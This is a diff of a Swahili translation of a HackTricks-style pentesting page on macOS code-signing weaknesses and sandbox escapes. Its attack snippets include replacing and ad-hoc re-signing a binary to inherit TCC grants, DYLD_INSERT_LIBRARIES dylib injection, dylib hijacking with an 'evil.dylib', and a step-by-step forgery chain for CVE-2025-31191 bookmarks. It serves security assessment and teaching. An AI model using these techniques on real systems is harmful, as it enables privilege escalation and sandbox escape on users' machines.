@@ -1,21 +1,20 @@
-# Udhaifu wa Code Signing ya macOS na Sandbox Escapes
+# Udhaifu wa Code Signing wa macOS na Sandbox Escapes
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Binaries Zilizosainiwa kwa Ad-Hoc
+## Ad-Hoc Signed Binaries
 
-### Taarifa za Msingi
+### Maelezo ya Msingi
 
-**Ad-hoc signing** (`CS_ADHOC`) huunda code signature isiyo na **certificate chain** — ni hash ya code bila uthibitishaji wa utambulisho wa developer. Asili ya binary haiwezi kufuatiliwa hadi kwa developer au shirika lolote.<sup>[[1]](#references)[[4]](#references)</sup>
+**Ad-hoc signing** (`CS_ADHOC`) huunda code signature yenye **no certificate chain**. Bado huhash code iliyosainiwa, hivyo validation inaweza kugundua modification, lakini haitoi developer identity ambayo component nyingine inaweza ku-authenticate. Kubadilisha na kusaini tena executable huzalisha CodeDirectory/CDHash tofauti.<sup>[[1]](#references)[[4]](#references)</sup>
 
-Kwenye Mac zenye Apple Silicon, executables zote zinahitaji angalau ad-hoc signature. Hii inamaanisha utapata ad-hoc signatures kwenye development tools nyingi, packages za Homebrew, na third-party utilities.
+Kwenye Apple Silicon Macs, executable zote zinahitaji angalau ad-hoc signature. Hii inamaanisha utapata ad-hoc signatures kwenye development tools nyingi, Homebrew packages, na third-party utilities.
 
 ### Kwa Nini Hili Ni Muhimu
 
-- **Hakuna utambulisho unaoweza kuthibitishwa** — binary inaweza kubadilishwa bila kugunduliwa na identity-based checks
-- Third-party ad-hoc binaries zilizo katika **nafasi zenye privileges** (FDA, daemon, helpers) ni malengo yenye kipaumbele cha juu
-- Kwenye baadhi ya configurations, ad-hoc signatures huenda **zisithibitishwe kwa ukali sawa** na code iliyosainiwa na developer
-- Ad-hoc signed binaries zilizo na **TCC grants** ni muhimu zaidi — grants hizo hudumu hata kama maudhui ya binary yatabadilika (inategemea jinsi TCC ilivyoweka ufunguo wa grant)
+- **Hakuna verifiable signer identity** — checks zinazokubali path pekee, ad-hoc status, au identifier isiyopinned haziwezi kubaini ni nani aliyetengeneza binary.
+- Third-party ad-hoc binaries zilizo kwenye **privileged positions** (FDA, daemons, helpers) ni targets zenye kipaumbele cha juu wakati file au parent directory yake inaweza kuandikwa.
+- CDHash, designated-requirement, au requirement-backed TCC check **hugundua** replacement. Path-based policy huenda isigundue; kagua requirement halisi na ujaribu tena grant badala ya kudhani kwamba itaendelea kufanya kazi baada ya re-signing.
 
 ### Ugunduzi
 ```bash
@@ -45,21 +44,21 @@ cp /tmp/malicious-binary /path/to/target
 # 4. Re-sign with ad-hoc signature (mimics the original)
 codesign -s - /path/to/target
 
-# 5. On next launch, the daemon runs your code with the original's TCC grants
-# (This works when TCC keyed the grant by path rather than code signature)
+# 5. Relaunch and verify the effective grant. It survives only when the
+#    authorization is path-based (or otherwise does not pin the old CDHash).
 ```
 ---
 
-## Processes Zinazoweza Kufanyiwa Debugging (get-task-allow)
+## Michakato Inayoweza Kuwekwa Debug (get-task-allow)
 
-### Taarifa za Msingi
+### Maelezo ya Msingi
 
-**`com.apple.security.get-task-allow`** entitlement (au **`CS_GET_TASK_ALLOW`** flag) huruhusu **process yoyote kujiambatisha kama debugger**, kusoma memory, kurekebisha registers, kuingiza code, na kudhibiti execution.<sup>[[3]](#references)</sup>
+Entitlement ya **`com.apple.security.get-task-allow`** (au flag ya **`CS_GET_TASK_ALLOW`**) humruhusu debugger aliyeidhinishwa kupata task port ya mchakato hata wakati Hardened Runtime kwa kawaida ingezuia hilo. Debugger aliyefaulu anaweza kusoma memory, kurekebisha registers, kuingiza code, na kudhibiti utekelezaji.<sup>[[3]](#references)</sup>
 
-Hii imekusudiwa **kwa development builds pekee**. Hata hivyo, baadhi ya third-party binaries husafirishwa zikiwa na entitlement hii katika production.
+Hii imekusudiwa **kwa build za development pekee**. Hata hivyo, baadhi ya binaries za third-party husafirishwa zikiwa na entitlement hii katika production.
 
 > [!CAUTION]
-> Production binary yenye `get-task-allow` ni **instant exploitation primitive**. Process yoyote ya ndani inaweza kuita `task_for_pid()`, kupata Mach task port ya target, na kuingiza arbitrary code inayotekelezwa kwa kutumia entitlements, TCC grants, na security context za target.
+> Binary ya production iliyo na `get-task-allow` ni primitive yenye nguvu ya exploitation. `taskgated`, utambulisho wa caller, sandboxing, debugger entitlements, na uidhinishaji wa Developer Tools bado huathiri ikiwa client fulani inaweza kupata task port; fanya majaribio kwa kutumia `lldb`/`debugserver` pamoja na injector inayokusudiwa. Mara attachment inapofaulu, code iliyoingizwa huendeshwa ikiwa na entitlements, TCC grants, na security context za target.
 
 ### Ugunduzi
 ```bash
@@ -105,17 +104,17 @@ VM_PROT_READ | VM_PROT_EXECUTE);
 
 ## Hakuna Uthibitishaji wa Library + Mazingira ya DYLD
 
-### Kuondoa Library Validation wakati wa Runtime
+### Kufuta Runtime Library-Validation
 
-Entitlement ya faragha **`com.apple.private.security.clear-library-validation`** haizuii library validation wakati wa kuanzisha process. Badala yake, inaruhusu process kuita `csops(..., CS_OPS_CLEAR_LV, ...)` yenyewe wakati wa runtime. Kisha XNU huondoa `CS_REQUIRE_LV | CS_FORCED_LV`, mradi caller ana entitlement hiyo na anakidhi ukaguzi wa ziada wa handler. Kwa hivyo, process inaweza kuwa target inayofaa ya library-injection tu baada ya kufikia code path inayoondoa library validation.<sup>[[4]](#references)[[5]](#references)</sup>
+Entitlement ya faragha **`com.apple.private.security.clear-library-validation`** haizimi library validation wakati wa kuanzisha process. Badala yake, inaruhusu process kuita `csops(..., CS_OPS_CLEAR_LV, ...)` yenyewe wakati wa runtime. XNU kisha hufuta `CS_REQUIRE_LV | CS_FORCED_LV`, mradi caller ana entitlement hiyo na anakidhi ukaguzi wa ziada wa handler. Kwa hiyo, process inaweza kuwa target inayofaa ya library-injection baada tu ya kufikia code path inayofuta library validation.<sup>[[4]](#references)[[5]](#references)</sup>
 
-### Muunganiko Hatari
+### Mchanganyiko Hatari
 
 Binary inapokuwa na **zote mbili**:<sup>[[3]](#references)</sup>
 - `com.apple.security.cs.disable-library-validation` (hupakia dylib yoyote)
-- `com.apple.security.cs.allow-dyld-environment-variables` (hukubali DYLD env vars)
+- `com.apple.security.cs.allow-dyld-environment-variables` (inakubali DYLD env vars)
 
-Hii ni **code injection primitive iliyohakikishwa** — `DYLD_INSERT_LIBRARIES` hufanya kazi kikamilifu.
+Huu ni mchanganyiko wa thamani kubwa kwa code-injection kwa sababu Hardened Runtime inaruhusu library isiyoaminika pamoja na DYLD environment variable. Launch context bado inaweza kusafisha DYLD variables (kwa mfano, protected au privileged execution paths), kwa hiyo thibitisha invocation halisi badala ya kuchukulia entitlement pair hii kuwa inafanya kazi bila masharti.
 
 ### Ugunduzi
 ```bash
@@ -133,7 +132,7 @@ SELECT path, privileged, tccPermsStr FROM executables
 WHERE noLibVal = 1 AND allowDyldEnv = 1
 ORDER BY privileged DESC;"
 ```
-### Attack: DYLD_INSERT_LIBRARIES Injection
+### Shambulio: DYLD_INSERT_LIBRARIES Injection
 ```bash
 # 1. Create the injection dylib
 cat > /tmp/inject.c << 'EOF'
@@ -170,23 +169,23 @@ cat /tmp/injected_proof.txt
 ```
 ---
 
-## Vighairi vya Muda vya Sandbox
+## Temporary Exceptions za Sandbox
 
-### Jinsi Vinavyodhoofisha Sandbox
+### Jinsi Zinavyodhoofisha Sandbox
 
-Vighairi vya muda vya Sandbox (`com.apple.security.temporary-exception.*`) hutoboa mianya kwenye App Sandbox:<sup>[[2]](#references)</sup>
+Sandbox temporary exceptions (`com.apple.security.temporary-exception.*`) hufungua mianya katika App Sandbox:<sup>[[2]](#references)</sup>
 
-| Exception | Kinaruhusu Nini |
+| Exception | Inaruhusu Nini |
 |---|---|
 | `temporary-exception.mach-lookup.global-name` | Kuunganisha kwenye huduma za XPC/Mach za mfumo mzima |
-| `temporary-exception.files.absolute-path.read-write` | Kusoma/kuandika faili zilizo nje ya app container |
+| `temporary-exception.files.absolute-path.read-write` | Kusoma/kuandika mafaili yaliyo nje ya app container |
 | `temporary-exception.iokit-user-client-class` | Kufungua miunganisho ya IOKit user-client |
-| `temporary-exception.shared-preference.read-only` | Kusoma mapendeleo ya apps nyingine |
+| `temporary-exception.shared-preference.read-only` | Kusoma preferences za apps nyingine |
 | `temporary-exception.files.home-relative-path.read-write` | Kufikia paths zinazohusiana na `~` |
 
-### Mach-Lookup Exceptions = Sandbox Escape Primitive
+### Mach-Lookup Exceptions = Primitive ya Sandbox Escape
 
-Exception hatari zaidi ni **mach-lookup** — inaruhusu app iliyo kwenye Sandbox kuwasiliana na daemons zenye privileges:
+Exception hatari zaidi ni **mach-lookup** — inaruhusu app iliyo kwenye sandbox kuwasiliana na daemons zenye privileges:
 ```bash
 # Find apps with mach-lookup exceptions
 find /Applications -name "*.app" -exec sh -c '
@@ -213,25 +212,83 @@ c. Fuzz each exposed method
 ```
 ---
 
+## Ukaguzi wa Code-Signing Si Uadilifu wa Mteja wa XPC
+
+Huduma ya XPC inaweza kuthibitisha connection kwa kutoa hali ya code-signing kutoka kwenye audit token yake na kukubali **platform binary** ya Apple au client yenye `CS_REQUIRE_LV`/`CS_FORCED_LV`. Majaribio haya yanaelezea executable na process flags zilizochaguliwa; hayathibitishi kwamba address space ya sasa ina code inayoaminika pekee. Utafiti dhidi ya huduma za ImageCapture ulionyesha kwamba Apple binary inayoweza kuingiziwa code, kama vile `/bin/ls`, inaweza kupakia attacker dylib kupitia `DYLD_INSERT_LIBRARIES` na kisha kuunganisha kama platform client. Ukaguzi wa kufuatilia library-validation flags pia ulipitishwa kabla Apple haijabadilisha huduma hiyo ili ihitaji private authorization entitlement yake katika macOS 15.<sup>[[6]](#references)</sup>
+
+### Offensive Audit Workflow
+
+1. Reverse `listener:shouldAcceptNewConnection:` (au XPC handler ya kiwango cha chini inayolingana) na tambua maamuzi yanayotegemea tu `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV`, au `CS_FORCED_LV`.
+2. Orodhesha Apple-signed clients zinazoweza kuwasiliana kwa kutumia protocol hiyo, kisha kagua Hardened Runtime na entitlements. Platform signature pekee si ushahidi kwamba DYLD injection imezuiwa.
+3. Test candidate kwenye **target macOS build**. Ikiwa constructor dylib inapakiwa, anzisha service connection kutoka kwenye constructor hiyo ili audit token ihusiane na platform process iliyokubaliwa.
+4. Rudia test kwa kila vendor patch: kuongeza process-status flag nyingine inayoweza kubadilishwa kwenye uamuzi huohuo wa authorization kunaweza kutoondoa confused-deputy primitive.
+```bash
+# Static triage of the intended client
+codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
+codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -
+
+# Dynamic check using the constructor dylib created earlier in this page
+DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
+```
+> [!NOTE]
+> Tabia ya DYLD, policy ya AMFI, na ukaguzi wa upande wa service hubadilika kati ya matoleo ya macOS. Kushindwa dhidi ya host iliyopata patches zote hakuthibitishi kwamba chain hiyo hiyo ilishindwa kwenye toleo lililo katika mazingira hatarishi.
+
+---
+
+## Security-Scoped Bookmark Forgery (CVE-2025-31191)
+
+Security-scoped bookmarks huhifadhi chaguo la faili la mtumiaji kati ya uzinduzi wa programu. Sandbox extension hufungwa na boot, hivyo `ScopedBookmarkAgent` huihalalisha na kuunda bookmark ya muda mrefu iliyothibitishwa kwa HMAC; programu inapowasilisha bookmark hiyo baadaye, agent huihalalisha na kutoa sandbox extension mpya. Signing secret huhifadhiwa kwenye login keychain, na per-app key hutengenezwa kwa kutumia bundle identifier.<sup>[[7]](#references)</sup>
+
+Kwenye mifumo iliyoathirika, keychain ACL ilizuia process isiyoaminika **kusoma** secret ya `com.apple.scopedbookmarksagent.xpc`, lakini haikuzuia kufutwa kwake. Programu ya sandbox iliyoathirika ingeweza kubadilisha item hiyo na secret inayojulikana pamoja na ACL inayodhibitiwa na attacker, kutengeneza app-specific HMAC key, kughushi entries kwenye bookmark plist ya writable container, na kuiomba `ScopedBookmarkAgent` izibadilishe kuwa file-access extensions. Hii ilifanya kila sandboxed application inayotumia security-scoped bookmarks kuwa sandbox escape inayoweza kupata arbitrary file access, bila kuhitaji file-picker interaction ya ziada. Apple ilirekebisha tatizo hili kwenye security updates za Machi 31, 2025.<sup>[[7]](#references)</sup>
+
+### Triage na Attack Chain
+```bash
+APP=/Applications/Target.app
+BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
+"$APP/Contents/Info.plist")"
+
+# Identify apps that can persist app- or document-scoped file access
+codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
+grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'
+
+# Locate app-managed bookmark stores; names and schemas are application-specific
+find "$HOME/Library/Containers" -type f \
+\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null
+
+# Inspect metadata for the agent's generic-password item (normally not its secret)
+security find-generic-password -s com.apple.scopedbookmarksagent.xpc
+```
+Mfuatano wa exploitation kwenye host iliyo hatarini ni:
+
+1. Pata code execution ndani ya app iliyo kwenye sandbox inayotumia persistent scoped bookmarks.
+2. Badilisha keychain signing item ya agent kwa secret inayojulikana na ACL inayoruhusu zaidi.
+3. Kokotoa `HMAC-SHA256(key=known_secret, data=bundle_id)` na forge bookmark ya path muhimu katika bookmark store inayoweza kuandikwa na app.
+4. Anzisha njia ya kawaida ya application ya bookmark-resolution ili `ScopedBookmarkAgent` irejeshe sandbox extension.
+5. Tumia file access mpya ku-overwrite execution au data target iliyo nje ya sandbox ambayo inapatikana kwa user huyo.
+
+Hii ni **technique ya patched-version**: itumie kuelewa trust boundary na kutathmini systems ambazo hazijafanyiwa patch, si kama dhana kuhusu releases za sasa. Kwa testing ya sasa, lenga bookmark parsing, identity binding, keychain-item lifecycle, na tabia ya confused-deputy inayohusiana na agent.
+
+---
+
 ## Entitlements za Apple za Kibinafsi
 
 ### Ni Nini
 
-Entitlements zenye kiambishi `com.apple.private.*` hutoa ufikiaji wa **Apple-internal APIs** ambazo hazijaandikwa kwenye nyaraka au hazipatikani kwa third-party developers. Third-party binaries zenye private entitlements huzipata kupitia enterprise cert, MDM, au non-App-Store distribution.
+Entitlements zenye kiambishi `com.apple.private.*` hutoa access kwa **Apple-internal APIs** ambazo hazijaandikwa kwenye documentation au hazipatikani kwa third-party developers. Third-party binaries zenye private entitlements huzipata kupitia enterprise cert, MDM, au usambazaji usio wa App Store.
 
-### Private Entitlements Hatari
+### Private Entitlements Hatarishi
 
-| Entitlement | Uwezo |
+| Entitlement | Capability |
 |---|---|
-| `com.apple.private.tcc.manager` | Kusoma/kuandika hifadhidata nzima ya TCC |
-| `com.apple.private.tcc.allow` | Kufikia huduma mahususi za TCC |
+| `com.apple.private.tcc.manager` | Usomaji/uandishi kamili wa TCC database |
+| `com.apple.private.tcc.allow` | Access kwa TCC services mahususi |
 | `com.apple.private.security.no-sandbox` | Kuendesha bila sandbox |
-| `com.apple.private.iokit` | Ufikiaji wa moja kwa moja wa IOKit driver |
-| `com.apple.private.kernel.\*` | Ufikiaji wa kernel interface |
-| `com.apple.private.xpc.launchd.job-label` | Kusajili/kusimamia launchd jobs |
-| `com.apple.rootless.install` | Kuandika kwenye paths zinazolindwa na SIP |
+| `com.apple.private.iokit` | Direct IOKit driver access |
+| `com.apple.private.kernel.\*` | Kernel interface access |
+| `com.apple.private.xpc.launchd.job-label` | Kusajili/kudhibiti launchd jobs |
+| `com.apple.rootless.install` | Kuandika kwenye paths zilizolindwa na SIP |
 
-### Ugunduzi
+### Discovery
 ```bash
 # Find third-party binaries with private entitlements
 find /Applications /usr/local -type f -perm +111 -exec sh -c '
@@ -250,13 +307,13 @@ ORDER BY privileged DESC;"
 ```
 ---
 
-## Profiles za Sandbox Maalum (SBPL)
+## Custom Sandbox Profiles (SBPL)
 
-### Ni Nini
+### Hivi Vilivyo
 
-Binaries zinaweza kusambazwa zikiwa na **custom sandbox profiles** zilizoandikwa kwa SBPL (Seatbelt Profile Language). Profiles hizi zinaweza kuwa zenye vizuizi zaidi AU **zinazoruhusu zaidi** kuliko App Sandbox ya kawaida.
+Binaries zinaweza kujumuisha **custom sandbox profiles** zilizoandikwa kwa SBPL (Seatbelt Profile Language). Profiles hizi zinaweza kuwa na vizuizi zaidi AU **kuwa zenye ruhusa zaidi** kuliko App Sandbox ya kawaida.
 
-### Ukaguzi wa Custom Profiles
+### Kukagua Custom Profiles
 ```bash
 # Find custom sandbox profiles
 find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null
@@ -278,7 +335,7 @@ cat /path/to/custom.sb | grep "(allow" | sort -u
 
 ### Ni Nini
 
-Wakati binary inapopakia dynamic library kutoka kwenye path ambayo user wa sasa anaweza **kuandika**, library hiyo inaweza kubadilishwa na code hasidi.
+Binary inapopakia dynamic library kutoka kwenye path ambayo mtumiaji wa sasa anaweza **kuandikia**, library hiyo inaweza kubadilishwa na code hasidi.
 
 ### Ugunduzi
 ```bash
@@ -328,4 +385,6 @@ cp /tmp/evil.dylib /path/to/writable.dylib
 - [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
 - [4] [XNU — `bsd/sys/codesign.h` (operesheni za `CS_OPS_*` na `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
 - [5] [XNU — `bsd/kern/kern_proc.c` (handler ya `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
+- [6] [Enzi Mpya ya macOS Sandbox Escapes: Kuchunguza Attack Surface Iliyopuuzwa na Kugundua Vulnerabilities Mpya Zaidi ya 10](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
+- [7] [Kuchanganua CVE-2025-31191: macOS security-scoped bookmarks-based sandbox escape](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
 {{#include ../../../banners/hacktricks-training.md}}
